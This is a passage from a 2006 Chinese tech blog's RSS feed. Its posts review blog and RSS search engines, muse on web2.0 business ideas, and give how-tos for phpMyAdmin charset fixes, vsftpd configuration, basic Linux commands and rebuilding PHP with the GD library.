Daypop 是第一代博客/聚合搜索引擎之一，曾在2001年和2002年荣获Search Engine Watch最佳提名（Search Engine Watch每年对所有搜索引擎进行一次分类评选）。Daypop的运作完全依靠其创始人和所有者Dan Chan一人之力，因此较之其他同类工具缺乏一定的发展动力。
Daypop的高级搜索页面提供有基本的按日期过滤结果，此外还有其他博客/聚合搜索工具未曾推出的按指定语言或国家限制搜索结果。
Daypop搜索框底部显示了其当前搜索范围，涉及59000个新闻网站、博客网站及RSS 聚合。
Feedster（http://www.feedster.com）
Feedster 提供了多种有趣的特色功能，如订阅某个搜索请求并将其保存为一个feed，或通过电子邮件发送新的搜索结果。此外，较之全文本搜索，Feedster还提供有独特的搜索聚合内容内含信息和搜索聚合地址。在搜索聚合地址时，用户可以利用关键字或URL搜索，或者两者结合进行搜索。
在Feedster高级搜索页面，用户可将搜索范围限制在某个聚合地址，也可以是多个聚合。此外，还能过滤某些聚合，包括你自己的。
Feedster主页顶部显示其当前搜索量达到14,000,569个feeds（聚合地址）。
Findory Blogory（http://findory.com/blogs/）
Findory 是一款新闻搜索工具，同时具有独立的博客搜索功能。Blogory的主页版面看起来与Google新闻主页相似，页面顶部首先列出的是“top blogs”热门博客，接着是按照类别组织的其他博客链接，包括商业、政治、科技、个人、教育、综合、法律、娱乐、世界、地区、运动、艺术、图书、健康、科学。
Blogory没有提供博客高级搜索，但其具有独特的个性化适应性RSS聚合功能，基于用户的兴趣或其他已经越多的博客自动为用户寻找适当的博客。
Gigablast 博客搜索（http://blogs.gigablast.com/）
Gigablast是一个网络搜索引擎，同时提供博客搜索。虽然博客搜索还处于测试版，但搜索结果质量较之其他博客搜索引擎有过之而无不及。Gigablast没有为各个搜索选项分别设置高级搜索页面，但利用共用的高级搜索页面也能够很好地精确搜索结果。
Gigablast还提供XML搜索服务，基于Gigablast搜索结果创建自己的聚合。虽然此功能稍显多余，但对于希望跟踪Gigablast搜索结果的用户还说，还是值得一用。 Gigablast 还提供其他搜索选项，其中网页索引量达到2,068,530,608，博客索引量达到27,086,736个网页，旅游搜索量达到5,420,820个网页，政府搜索量达到34,367,200个网页。Gigablast除了网页和目录搜索外，其他搜索功能均为测试阶段。
IceRocket博客搜索（http://www.icerocket.com/?tab=blog）
与Gigablast类似，IceRocket也提供多种搜索选项，包括网页搜索、新闻搜索、手机图片搜索、图片搜索、多媒体搜索。IceRocket博客高级搜索页面提供有基本的布尔算子搜索和时间区间过滤搜索，并提供有独特的按作者搜索功能。
IceRocket最近宣布将名称改为BlogScour，但未透露是否保留其他搜索选项。
PubSub（http://www.pubsub.com）
本文所列的所有博客和聚合搜索工具中，PubSub显得较为独特。
第一，PubSub不提供直接搜索。用户必须首先为某个自己感兴趣的关键字创建订阅，然后PubSub将把随时找到的相匹配的最新内容通过预警方式通知用户。预警方式包括电子邮件、SMS、PDA/移动设备及即时通讯工具等。
PubSub的第二个独特之处在于，它是一款“实时”搜索工具。也就是说，当新内容被发布到网络后，用户几乎马上就能得到预警通知，第一时间获得这些信息。
目前，PubSub的存储量超过1600万博客，50,000多个互联网新闻组及所有SEC美国证监会（EDGAR，电子数据集中与报告系统）文件。
Technorati （http://www.technorati.com）
Technorati提供有网络搜索、标签搜索和博客搜索，并允许用户分别按关键字、URL或标签进行搜索。在Technorati的统一搜索页面上，集合了所有搜索方式，用户只要在恰当的搜索框内输入不同格式的搜索请求，就能获得相匹配的搜索结果。
Technorati网络搜索当前可跟踪1,680万网站和15亿链接；标签搜索可跟踪实时更新的200万个网络标签；博客搜索目前还是测试版，实际是Technorati按照主题组织的博客目录。
此外，Technorati的流行列表也值得一看。在这里，Technorat按照新闻、书籍、电影、Top 100博客等，展示了网上用户当前关注的各种热门话题。流行列表中的所有资源都保持实时更新状态。
主流搜索引擎与RSS
大量小型但专业的RSS搜索引擎涌现的同时，主流搜索引擎又在作何打算呢？尽管这些主流引擎都在窥觑RSS搜索，但目前还未有任何一家推出较为成熟的RSS搜索服务。
|. Ask Jeeves已经通过旗下Bloglines推出RSS搜索服务，并承认RSS为其重要发展项目之一。但Bloglines是否继续拓展，集成类似于 Teoma的强大搜索能力，还是Ask公司继续Bloglines现有的RSS搜索能力仍未为可知。最大的可能性是以其他补充功能来增强这两种服务。
||. Google没有为RSS聚合内容开通独立搜索入口，但自从Google推出可定制个性化首页之后，Google用户就可以通过“创建新的板块” （create a new section）链接，发现寻找聚合内容的搜索框。此外，用户还可以在任意Google搜索框内，使用“filetype:rss”及 “filetype:xml”命令过滤聚合信息。最新推出的Google Desktop 2桌面搜索第二代还增加了专门针对RSS聚合内容的自动搜索功能。</description>
    </item>
    
    <item>
      <title>一直不知道自己要做什么</title>
      <link>http://example.org/2006/04/27/e4b880e79bb4e4b88de79fa5e98193e887aae5b7b1e8a681e5819ae4bb80e4b988/</link>
      <pubDate>Thu, 27 Apr 2006 05:51:30 +0000</pubDate>
      
      <guid>http://example.org/2006/04/27/e4b880e79bb4e4b88de79fa5e98193e887aae5b7b1e8a681e5819ae4bb80e4b988/</guid>
      <description>无意间看到这篇文章,想想自己要做点什么呀
web2.0服务
1.更好和更廉价的网上存储Better and Cheaper Online File Storage 图片、电影、音乐和重要文件占据大量的硬盘空间。令人惊奇的是，我们所有人都无法将重要文件放在网络支持的平台上。就我所知，唯一的原因是还为生产出有合适的性能和合适价格的产品满足此类需求。我们需要一个好的产品，类似Flickr那样便于客户端上载并容易网络连结。
2. 博客/网站和邮件列表 人们可以借助RSS获得我网站的信息，但是尚没有恰当的服务能使用户通过邮件订阅我的网站。 3. 便携的声誉（Portable Reputations） 需要一个能够在整个互联网空间通用的身份－反馈系统。 4.定制的当地信息服务（ Tailored Local Offers (via RSS) 建立一个网站。让用户顺应其意愿给出人口统计方面的和私人的信息。进入当地商业领域的大型销售公司的伙伴、城市搜索、黄页、个人资讯。通过邮件、网站和RSS给我提供当地的特产、5美元的比萨、免费的初次干洗、一杯咖啡。不论是什么，都能消受。 5. 其他国家的Facebook（将全美大学生联系一起的一种社交网络） 很多人准备做？你为何不试试？ 6. 免费音乐 音乐总有一日会在符合法律地免费。这是没有办法的事。艺术家、标签和促销员要另谋出路了。 7. 开放源代码黄页 为黄页信息贴上标签（tag）并且使他成为开放资源。靠当地广告和高级列表赚钱。 8. 播客抄录（Podcast Transcriptions） 博客需要抄录文本。许多人没有时间也不想听所有的博客内容。而搜索引擎不能检索博客内容。抄录内容解决和这两个问题。 9. 分布式评论聚合（Decentralized Review Aggregation） 对每个产品和每个事物都有着数百万充满激情的评论，这些东西都可以考虑呈现在博客圈中。别指望人们重复书写这些文字。用有影响的标签（tag）、RSS，甚至微格式（microformat）聚合它们，使其可搜索和可发现。 10. 用SSE做很酷的东西 在别人开始做之前，权衡清楚，然后做漂亮和新奇的玩意。 什么时候要做,要做哪个呀?</description>
    </item>
    
    <item>
      <title>谁在赚web2.0消费用户的钱？</title>
      <link>http://example.org/2006/04/27/e8b081e59ca8e8b59aweb20e6b688e8b4b9e794a8e688b7e79a84e992b1efbc9f/</link>
      <pubDate>Thu, 27 Apr 2006 05:20:27 +0000</pubDate>
      
      <guid>http://example.org/2006/04/27/e8b081e59ca8e8b59aweb20e6b688e8b4b9e794a8e688b7e79a84e992b1efbc9f/</guid>
      <description>那天跟一个开网络商店卖衣服卖时尚用品的朋友闲聊，无意中听到了一个窍门：“女人都贪靓，喜欢的都是花俏的新款式，而男人的东西很难卖，男人都爱买牌子货”。从消费行为看，女人是感性的，男人是理性的，女人比男人更容易受诱惑。男人和女人上街，除了“埋单”，就没男人的什么事了。男人赚钱，女人花钱，似乎天经地义。如果仔细观察身边，我们也许会看到“父母赚钱，孩子消费”，孩子才是花钱的“冤大头”。苦什么，也不会苦了孩子。读了大学的年轻人呢，和他们的父母一代相比更富足了，收入多了，花钱的速度也更快。因为能让他们心动，让他们大手大脚花钱的地方实在是太多了。
这些上世纪八、九十年代出生的年轻人，是点着鼠标伴随互联网成长的新一代。他们不玩丢手绢，不跳马兰开花二十一；他们上网，玩游戏，聊QQ，他们在网上无所不玩，只要新鲜好玩，花了钱他们也爱玩。正是依靠青少年的网络热情，网易、腾讯才成为中国最赚钱的互联网公司。 年轻网民着迷的三种网络新玩法 对于全球的互联网公司来说，年轻人正在给他们更多的遐想空间。除了收发电子邮件、下载音乐、网络聊天、网络游戏，年轻人在网络上玩的东西越来越多。根据2006年最新发布的一份调查报告显示，全球年轻网民使用互联网的三大趋势是：找到一个有归属感的网上社区、在网上进行自我表达、通过网络实现个性化的互动交流。这份报告是雅虎公司和浩腾媒体对中国、美国、俄罗斯、德国、法国、英国和韩国等11个国家和地区的13岁至24岁网民调查分析后得出的最新数据。 这份报告不是空穴来风。2005年以来，年轻人对博客、网上社区交友这些web2.0的新玩意疯狂着迷。在国外，Blogs、BlogSpot、flickr、myspace、facebook取得了爆炸性的增长。国内的博客网站如blogcn、anyp，猫扑、天涯等社区，发展迅猛，深受白领和大学生们的欢迎。年轻人如果没有一个blog，就像不知道超级女声是什么一样，被亲近的人耻笑落伍了。 年轻人爱玩出新花样，他们把网络当成个性化的展台，在博客、社区这些新天地里秀出自己。他们已经不满足于追捧和模仿，“顶”、“垃圾”对他们太简单了；他们要秀，要玩，让别人也“顶”自己。他们在QQ里秀新衣服、发好玩的图片表情，他们在anyp里秀模板、秀挂饰、玩网页特效，他们敢在天涯猫扑里贴出自己的低胸爆乳图片、说很变态的笑话故事.....他们玩自己的，在自己的小圈子里玩出快感。 年轻用户“玩”出的商业机会 年轻人的网络个性化，正在“玩”出比web1.0时代不同的商业机会，他们太年轻、太有钱、太爱花钱，让人不敢相信，却不得不服。仅仅博客这个领域，年轻用户就让很多美国投资人垂涎三尺。美国的市场调查公司Comscore的2005年的一份报告显示，与一般互联网用户相比，博客的用户更加年轻、富裕、用宽带上网、网上花费更多。有关调查结果如下： 博客阅读者的平均每周上网时间为23小时，而一般网民的平均时间是13小时； 博客用户使用宽带上网者比一般网民多出11%； 博客阅读者中年收入超过7.5万美元的用户比非BLOG阅读者多出11%； 博客阅读者更有可能进行网上购物活动：在2005年第一季度中，全部网民中进行过网上购物的不到40%，但BLOG读者实施网上购物的超过了51%，同时花费的金额比一般网民平均多出6%。
根据上面的数据，Comscore由此推测，博客用户的商业价值比一般互联网用户更高，博客读者群对网络广告客户来说是一群极富吸引力的受众（资料来自新竞争力网络营销管理顾问网站）。当然，博客的广告，也不同与传统的门户广告，更可能是互动性更强的交互式广告。除了广告，web2.0网站更多是开发用户的应用与需求，从用户的增值服务上寻求商机。在美国，硅谷的六度分割有限公司（Six Apart,Ltd.）就拥有100多万的付费博客用户，myspace用户27万付费会员，国内的博客网站中，博易anyp和博客大巴也开发了收费博客的服务。 中国web2.0网站做年轻用户没机会？ 年轻用户是潜在的金矿，让人羡慕，也让人妒忌。谢文最近说，国内的web2.0公司不应再做20岁的年轻用户，因为“网易和腾讯一旦想做，没人能打得过”。谢文这话好像缺乏了“web2.0精神”，就像是老人告诉后辈，山中有老虎，大家不要去打柴。谢文忘记了，web2.0就是创新公司，撞南墙并不可怕，雅虎当年在搜索上这么强劲，google不也是闯出了新天地。我觉得在国内，最先成功，最先赚钱的应该是中小型的创新公司。网易忙于游戏，腾讯无暇在QQ-zone上大投入，丁磊才说“门户随时复制web2.0”，复制才是他们的真实用意。 这个写的倒时很好,唉真不知道自己要做点什么呀!</description>
    </item>
    
    <item>
      <title>phpMyAdmin-2.6.0以上版本显示MySQL数据库中文乱码问题</title>
      <link>http://example.org/2006/04/26/phpmyadmin-260e4bba5e4b88ae78988e69cace698bee7a4bamysqle695b0e68daee5ba93e4b8ade69687e4b9b1e7a081e997aee9a298/</link>
      <pubDate>Wed, 26 Apr 2006 04:52:47 +0000</pubDate>
      
      <guid>http://example.org/2006/04/26/phpmyadmin-260e4bba5e4b88ae78988e69cace698bee7a4bamysqle695b0e68daee5ba93e4b8ade69687e4b9b1e7a081e997aee9a298/</guid>
      <description>在使用phpMyAdmin-2.6.0以上版本进行数据库管理操作时，页面上显示的中文为乱 码。更改页面的语言设置和连接校对都没有作用，依然显示乱码。
在MySQL-4.0以上和phpMyAdmin-2.6.0以上版本组合中，会出现以上问题；在MySQL -3.x和任意版本phpMyAdmin，或者phpMyAdmin-2.6.0一下(含2.6.0)和任意版本 MySQL不会出现上述问题。
造成以上问题的原因在于，数据库存储时的字符集，和phpMyAdmin认为的数据库字 符集，以及页面显示的字符编码没有对应到正确的值。
例如：在prima中，数据库内容的字符集为gb2312，数据库字符集是默认的 latin1，这样的数据库内容在小于等于phpMyAdmin- 2.6.0上显示没有问题，但是 在phpMyAdmin-2.6.0以上版本，默认数据库字符集都是utf-8，这时就产生了上述 问题。
所以，解决问题的关键，是把这几个值都设置成相应的正确的值。
问题解决： 为了便于描述，这里拿prima来作为示例。当用户自己升级了phpMyAdmin到2.6.0以 上版本之后，登录之后发现中文都变成了乱码，但是，这时站点页面上的显示是正 常的。这是，只需要改phpMyAdmin文件中的两处，即可解决。
在libararies/select_lang.lib.php文件中，找到$mysql_charset_map的赋值 段，将其中的&amp;rsquo;gb2312&amp;rsquo; =&amp;gt; &amp;lsquo;gb2312&amp;rsquo;改为&amp;rsquo;gb2312&amp;rsquo; =&amp;gt; &amp;rsquo;latin1&amp;rsquo;； 在libararies/select_lang.lib.php文件中，找到$available_languages赋值 段，将&amp;rsquo;zh- gb2312&amp;rsquo; =&amp;gt; array(&amp;lsquo;zh|chinese simplified&amp;rsquo;, &amp;lsquo;chinese_simplified-gb2312&amp;rsquo;, &amp;lsquo;zh&amp;rsquo;)改为&amp;rsquo;zh-gb2312-utf-8&amp;rsquo; =&amp;gt; array(&amp;lsquo;zh|chinese simplified&amp;rsquo;, &amp;lsquo;chinese_simplified-gb2312&amp;rsquo;, &amp;lsquo;zh&amp;rsquo;) 修改之后，保存文件，这时登录phpMyAdmin，语言选择的时候，选择Chinese simplified (zh-gb2312-utf-8)，然后在查看数据库，这时就正常了。
说明： 原则上，只需要做以上修改步骤中的第一步就可以解决问题。因为已经确定了正确 的内容字符集和数据库字符集的对应关系。phpMyAdmin中，数据库字符集是和语言 选择相关联的，所以这时只要选择Chinese simplified (zh-gb2312)就可以了。但 是，由于phpMyAdmin的设计，在页面上并不能显示出非utf-8的语言字符集选项， 所以，需要对$ available_languages进行修改。将zh-gb2312后边加上utf-8使页 面能显示出这个选项，需要使用时，选择Chinese simplified (zh-gb2312-utf- 8)。经测试，修改之后，用phpMyAdmin查看和修改数据库都没有问题，页面使用 gb2312字符编码。
结论： 以上只是通过prima来说明问题，其他情况可以参照以上方法解决，无非是数据库 字符集和页面显示字符集的设定。</description>
    </item>
    
    <item>
      <title>vsftp安装配置</title>
      <link>http://example.org/2006/04/26/vsftpe5ae89e8a385e9858de7bdae/</link>
      <pubDate>Wed, 26 Apr 2006 04:08:38 +0000</pubDate>
      
      <guid>http://example.org/2006/04/26/vsftpe5ae89e8a385e9858de7bdae/</guid>
      <description>公司要配置一台FreBSD的服务器,虽然以前没接触过着个系统,可是老板的话就是命令,没办法^_^,那就动手吧,看了不少资料,自己也在VMware里测试了多次,把自己的操作过程记录一下,供大家参考.如有不足不对之处请大家指点. 配置网站服务器,FTP服务必不可少,那就先来这个了,再罗嗦有人要扔砖了,呵呵.
1、安装 通过ports安装，这个方式比较简单。 # cd /usr/ports/ftp/vsftp # make install 2、配置 (1)编辑/usr/local/etc/vsftpd.conf # ee /usr/local/etc/vsftpd.conf Anonymous_enable=NO (禁止匿名登陆) Local_enable=YES (允许本地用户登陆) Local_umask=022 (FTP上本地的文件权限755，默认是077) Connect_form_port_20=yes (启用FTP数据端口的数据连接) Xferlog_enable=yes (激活上传和下传的日志) Xferlog_std_format=yes (使用标准的日志格式) Idle_session_timeout=120(秒) (用户会话空闲后2分钟) Data_connection_timeout=300(秒) (将数据连接空闲5分钟断) Ascii_upload_enable=YES (起用ASCII方式上传) Ascii_download_enable=YES帮带(起用ASCII方式下载) Ftpd_banner=Welcome to blah FTP service. (FTP服务器登陆欢迎信息) Chroot_list_enable=YES (开启锁定用户目录) Chroot_list_file=/任意路径/vsftpd.chroot_list (要锁定目录的用户保存文件，格式为每个用户一行) 注：如果想把本地的任何用户都锁定在自己的目录中的话，把上面两行注释掉，再增加这一样 Chroot_local_user＝YES 保存退出 (2)编辑/etc/inetd.conf # ee /etc/inetd.conf 增加这一行并去掉前面的注释(#号) #ftp stream tcp nowait root /usr/local/libexec/vsftpd vsftpd 保存退出 (3)编辑/etc/rc.conf # ee /etc/rc.conf 增加下面内容： inetd_enable=&amp;quot;YES&amp;quot; 注：以上是以inetd的方式启动vsftp的，我们也可以以独立进程的方式启动vsftp，具体如下： a、注释掉inetd里面的vsftpd这一行。 b、在vsftpd.conf文件里增加listen＝YES这句。 c、进入/usr/local/libexec/目录，执行./vsftpd &amp;amp; 。 d、想要让vsftp随系统启动，可在/usr/local/etc/rc.</description>
    </item>
    
    <item>
      <title>vsFTPd 服务器初学者指南（欢迎大家参与补充）</title>
      <link>http://example.org/2006/04/26/vsftpd-e69c8de58aa1e599a8e5889de5ada6e88085e68c87e58d97efbc88e6aca2e8bf8ee5a4a7e5aeb6e58f82e4b88ee8a1a5e58585efbc89/</link>
      <pubDate>Wed, 26 Apr 2006 04:03:07 +0000</pubDate>
      
      <guid>http://example.org/2006/04/26/vsftpd-e69c8de58aa1e599a8e5889de5ada6e88085e68c87e58d97efbc88e6aca2e8bf8ee5a4a7e5aeb6e58f82e4b88ee8a1a5e58585efbc89/</guid>
      <description>1、vsFTPd，目前常用FTP服务器套件；
vsFTPd是一款在Linux发行版中最受推崇的FTP服务器程序；特点是小巧轻快，安全易用；能让其自身特点得发发挥和掌握，也然最主要的是会用；
目前在开源操作系统中常用的FTPD套件主要有ProFTPD、PureFTPd和wuftpd等；至于哪个FTP服务器套件更好，哪个是你最熟悉的，哪个就是最好的；
2、ftp 用户管理解说；
FTP服务器对用户的管理，在默认的情况下是根据 /etc/passwd及/etc/group 来进行的，所以我们一定要了解Linux系统用户和用户组的管理，用户和用户组的管理是一切应用的的基础，有的弟兄不想去了解基础的东西，就想一步成架好各种服务器，事实证明这种学习方法是最不明智的；虽然在您可能在几分钟启动了ftp服务器，但遇到问题时，您不一定能知道是哪里出错；所以基础还是极为重要的；
推荐文章： 《Linux 用户（user）和用户组（group）管理概述》
2.1、匿名ftp 用户和用户组的理解；
当我们访问各大FTP上访问时，可能我们不去想我们以什么身份登录的，如果他的FTP允许匿名登录的话；比如我们在浏览器上打入；
ftp://mirrors.kernel.org 或 ftp://ftp:ftp@mirrors.kernel.org 我们会发现上面的两行最终都能访问，而且显示的结果也完全一样，最终都跳到 ftp://mirrors.kernel.org 地址；那我们访问这个FTP时，是不是有用户和密码呢？是的，也是需要在的，只是在服务器端允许匿名访问，而匿名访问的用户名和密码都是ftp，只是我们因为匿名访问，没有感觉到他有用户名和密码罢了。第二个地址就是以ftp用户，密码也是ftp来访问 ftp://mirrors.kernel.org；
如果我们以ftp命令连接 mirrors.kernel.org 时，我们会发现需要输入用户ftp，密码ftp才能访问；
在FTP服务器中，匿名用户的用户名和密码都是ftp ；这个用户可以在您的操作系统中的 /etc/passwd 中能找得到；可能有类似下面的一行；
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin 说明：
/etc/passwd 是系统用户的配置文件；/etc/group是系统用户组配置文件，您可以通过 《Linux 用户（user）和用户组（group）管理概述》 及其相关文档中了解一些用户管理的一些基础知识；
在ftp用户这行中，我们看到七个字段，每个字段写字段之间用:号分割；
ftp 是用户名 x 是密码字段，是隐藏的； 14 是用户的UID字段，可以自己来设定，不要和其它用户的UID相同，否则会造成系统安全问题； 50 用用户组的GID，可以自己设定，不要和其它用户组共用FTP的GID，否则会造成系统全全问题； FTP User 是用户说明字段； /var/ftp 是ftp用户的家目录，可以自己来定义； /sbin/nologin 这是用户登录SHELL ，这个也是可以定义的，/sbin/nologin 表示不能登录系统；系统虚拟帐号（也被称为伪用户）一般都是这么设置。比如我们把ftp用户的/sbin/nologin 改为 /bin/bash ，这样ftp用户通过本地或者远程工具ssh或telnet以真实用户身份登录到系统。这样做对系统来说是不安全的；如果您认为一个用户没有太大的必要登录到系统，就可以只给他FTP帐号的权限，也就是说只给他FTP的权限，而不要把他的SHELL设置成 /bin/bash 等；
关于ftp用户组的理解：
我们查看 /etc/group 的时候，会发现类似这样一条；
ftp:x:50: /etc/group 是用户组的管理配置文件，上面这行表示用户组ftp，x是密码段，50是GID；我们对照在/etc/passwd中的ftp那行得知ftp用户是属于ftp用户组的，因为ftp用户那行中的GID和ftp用户组的GID是相同的；
2.2、匿名ftp 用户和ftp用户组是否可以删除
在一般情况下是不能把/etc/passwd和/etc/group 中有把ftp用户和用户组的行删除的，因为FTP服务器是需要他们来对FTP用户实现管理，在默认的情况下。</description>
    </item>
    
    <item>
      <title>ftP教程</title>
      <link>http://example.org/2006/04/26/ftpe69599e7a88b/</link>
      <pubDate>Wed, 26 Apr 2006 03:13:50 +0000</pubDate>
      
      <guid>http://example.org/2006/04/26/ftpe69599e7a88b/</guid>
      <description>很久没有上来了，也很久没有碰电脑了。本来想当北南南北那样的写手，呵呵，自己想了半天，还没有出来。于是把我论文里的其中一段搬上来。（里面也有抄的） Linux下VsFTP配置全方案 纲要： 一， VsFTPd的简述 二， 企业Linux下vsFTPD方案 三， VsFTPD相关配置文件详解 一,VsFTPd的简述: VSFTP（Very Secure FTP Daemon，非常安全的FTP服务器）。顾名思义，VSFTPD设计的出发点就是安全性。同时随着版本的不断升级，VSFTPD在性能和稳定性上也取得了极大的进展。除了安全和性能方面很优秀的外，还有很好的易用性。Red Hat公司在自己的FTP服务器(ftp.redhat.com)上就使用了vsFTPd 二，企业Linux下vsFTPD实战方案 要求：
用户:netseek_com；FTP：ftp.netseek.com(192.168.0.21,我已经配置好了相关的DNS) 禁止匿名登陆，禁止用户离开用户目录 命令通道端口使用5021，数据通道端口使用5020（你可以改成你想设置的端口如1021,1020） 允许使用被动模式使用端口范围为10010~10020. 用户带宽设置为200kps；用户空间大小限制为300M，允许宽限期限内有10MB的缓冲 具体操作步骤如下： 为了更完全的描述安装全过程，我在我的另一台主机（netseek）上进行配置，在台机IP:192.168.0.20上绑定了192.168.0.21,也配置好了相关的DNS解析，在这里我就不多说了请参照”Linux全能web服务器架设”。 1． 配置相关服务 启动服务： [root@netseek root]# #rpm –qa | grep vsftpd ；查看是否安装vsftpd服务 #/etc/init.d/vsftpd start ;启动服务 #chkconfig vsftpd on ;让系统服务随着系统启动而启动 配置相关文档： #vi /etc/vsftpd/vsftpd.conf 禁止匿名用户访问： anonymous_enable=YES,将YES改为NO 在文件末尾加如下的设置： new added by netseek listen_port=5021 ;命令通道端口，默认为21 listen_data_port=5020 ;数据通道端口，默认为20 pasv_enable=YES ;允许被动模式 pasv_min_port=10000 ；被动模式使用端口范围 pasv_max_port=10010 local_max_rate=200000 ；用户宽带限制 chroot_local_user=YES ；禁用户离开主目录 listen_address=192.168.0.21 ；让他监听ip:192.168.0.21 注：在添加过程中请不要加上”;”和这些中文注释，在这里我上为了方便大家了解才加上的。 2． 添加虚拟主机用户 添加用户netseek_com,用户目录指定为/var/www/netseek.</description>
    </item>
    
    <item>
      <title>Linux常用命令简介</title>
      <link>http://example.org/2006/04/22/linuxe5b8b8e794a8e591bde4bba4e7ae80e4bb8b/</link>
      <pubDate>Sat, 22 Apr 2006 22:33:38 +0000</pubDate>
      
      <guid>http://example.org/2006/04/22/linuxe5b8b8e794a8e591bde4bba4e7ae80e4bb8b/</guid>
      <description>su su命令是最基本的命令之一，常用于不同用户间切换。例如，如果登录为 user1，要切换为user2，只要用如下命令： $su user2 然后系统提示输入user2口令，输入正确的口令之后就可以切换到user2。完成之后就可以用exit命令返回到user1。 su命令的常见用法是变成根用户或超级用户。如果发出不带用户名的su命令 ，则系统提示输入根口令，输入之后则可切换为根用户。 如果登录为根用户，则可以用su命令成为系统上任何用户而不需要口令。
pwd pwd命令也是最常用最基本的命令之一，用于显示用户当前所在的目录。
cd cd命令不仅显示当前状态，还改变当前状态，它的用发跟dos下的cd命令基本一致。 cd ..可进入上一层目录 cd -可进入上一个进入的目录 cd ~可进入用户的home目录
ls ls命令跟dos下的dir命令一样，用于显示当前目录的内容。 如果想取得详细的信息，可用ls -l命令， 这样就可以显示目录内容的详细信息。 如果目录下的文件太多，用一屏显示不了，可以用ls -l |more分屏显示 。
find find命令用于查找文件。这个命令可以按文件名、建立或修改日期、所有者(通常是建立文件的用户)、文件长度或文件类型进行搜索。 find命令的基本结构如下： $find 其中指定从哪个目录开始搜索。指定搜索条件。表示找到文件怎么处理。一般来说，要用-print动作，显示 整个文件路径和名称。如果没有这个动作，则find命令进行所要搜索而不显示结果，等于白费劲。 例如，要搜索系统上所有名称为ye的文件，可用如下命令： $find / -name ye -print 这样就可以显示出系统上所有名称为ye的文件。
tar tar最初用于建立磁带备份系统，目前广泛用于建立文件发布档案。可用如下方法建立tar档案： $tar cvf 例如，如果要将当前目录中所有文件存档到ye.tar中，可用如下命令： $tar cvf ye.tar . 要浏览档案内容，将c选项变成t。如果要浏览ye.tar档案中的内容，可用如下命令： $tar tvf ye.tar 要取出档案内的内容，将c选项变成x。如果要将ye.tar档案中的内容取到当前目录中，可用如下命令： $tar xvf ye.tar
gzip gzip命令用于压缩文件。 例如，如果要将ye.txt文件压缩，可用如下命令： $gzip ye.txt 这样就可以压缩文件并在文件名后面加上gz扩展名，变成文件ye.txt.gz。 解压缩文件可用gzip -d命令实现： $gzip -d ye.txt.gz 这样就可以解压缩文件并删除gz扩展名。除此之外还可以用gunzip命令来解 压缩文件，效果跟用gzip -d命令一样。 旧版的tar命令不压缩档案，可用gzip压缩。例如： $tar cvf ye.</description>
    </item>
    
    <item>
      <title>Linux主机重编译（升级）PHP支持GD库</title>
      <link>http://example.org/2006/04/22/linuxe4b8bbe69cbae9878de7bc96e8af91efbc88e58d87e7baa7efbc89phpe694afe68c81gde5ba93/</link>
      <pubDate>Sat, 22 Apr 2006 21:54:15 +0000</pubDate>
      
      <guid>http://example.org/2006/04/22/linuxe4b8bbe69cbae9878de7bc96e8af91efbc88e58d87e7baa7efbc89phpe694afe68c81gde5ba93/</guid>
      <description>Linux主机重编译PHP支持GD库
*注意：请确认以下您服务器中Apache的安装路径，如果不是 /usr/local/apache2，则在进行以下安装操作时， 注意修改Apache的安装路径！
1、以root身份登录Linux主机；
2、停止Web Server服务，如果使用的是Apache可以通过以下命令停止： shell&amp;gt; /usr/local/apache2/bin/apachectl stop
3、卸载当前PHP和Zend Optimizer： shell&amp;gt; rm -rf /usr/local/php shell&amp;gt; rm -rf /usr/local/Zend shell&amp;gt; vi /usr/local/apache2/conf/httpd.conf 找到LoadModule phpX_module modules/libphpX.so 其中X是PHP版本（4或者5）一行，并将此行删除，保存退出。
4、下载安装Discuz! GD库安装包： shell&amp;gt; cd /usr/local/src shell&amp;gt; wget -c http://download.discuz.net/gdinstaller.tar.gz shell&amp;gt; tar xzvf gdinstaller.tar.gz shell&amp;gt; cd GDInstaller shell&amp;gt; ./install.sh
4、下载PHP 5.1.2： shell&amp;gt; cd /usr/local/src shell&amp;gt; wget -c http://download.discuz.net/php-5.1.2.tar.bz2
5、解压缩并安装PHP 5.1.2： shell&amp;gt; tar xjvf php-5.1.2.tar.bz2 shell&amp;gt; cd php-5.1.2 shell&amp;gt; ./configure &amp;ndash;prefix=/usr/local/php &amp;ndash;with-apxs2=/usr/local/apache2/bin/apxs &amp;ndash;with-zlib-dir &amp;ndash;with-bz2 &amp;ndash;with-tiff-dir &amp;ndash;with-libxml-dir &amp;ndash;with-gd &amp;ndash;with-freetype-dir &amp;ndash;with-jpeg-dir &amp;ndash;with-png-dir &amp;ndash;with-ttf &amp;ndash;enable-mbstring &amp;ndash;with-mysql &amp;ndash;with-config-file-path=/etc &amp;ndash;disable-ipv6 &amp;ndash;enable-gd-native-ttf *注意：如果MySQL不是以RPM包方式安装的，则需要将上述参数中的&amp;ndash;with-mysql 改为&amp;ndash;with-mysql=/usr/local/mysql shell&amp;gt; make shell&amp;gt; make install shell&amp;gt; cp php.</description>
    </item>
    
    <item>
      <title>Linux&#43;Apache&#43;PHP&#43;MySQL&#43;Zend Optimizer整合</title>
      <link>http://example.org/2006/04/22/linuxapachephpmysqlzend-optimizere695b4e59088/</link>
      <pubDate>Sat, 22 Apr 2006 21:48:37 +0000</pubDate>
      
      <guid>http://example.org/2006/04/22/linuxapachephpmysqlzend-optimizere695b4e59088/</guid>
      <description>一、前言
发现本版中很多用户的问题都是关于空间搭建的，所以写了这篇作文希望对大家有所帮助，这也是版主职责嘛，呵呵。这篇文章所描述的整合过程是针对Discuz!而写的，旨在让Discuz!更好的运行。原则就是用不到的东西就不装、不编、不配，最大程度让系统干净快速。
二、准备程序
以下所有程序的版本都是推荐使用的，并且是截止到本文发布时最新的版本。
Apache 2.0.55 下载地址：http://apache.justdn.org/httpd/httpd-2.0.55.tar.gz
PHP 4.4.1 下载地址：http://cn.php.net/get/php-4.4.1.tar.gz/from/cn2.php.net/mirror
MySQL 4.0.26 下载地址： http://downloads.mysql.com/archi &amp;hellip; t-4.0.26-0.i386.rpm http://downloads.mysql.com/archi &amp;hellip; r-4.0.26-0.i386.rpm
Zend Optimizer 2.6.0 下载地址：http://prdownloads.sourceforge.n &amp;hellip; pl1.tar.gz?download
PHPMyAdmin 2.7.0-pl1 下载地址：https://www.phpmyadmin.net 三、安装整合环境
1、准备工作：
由于Discuz!4.0的水印功能需要调用GD库实现，所以请先确定你的系统中已经安装了GD环境： QUOTE:
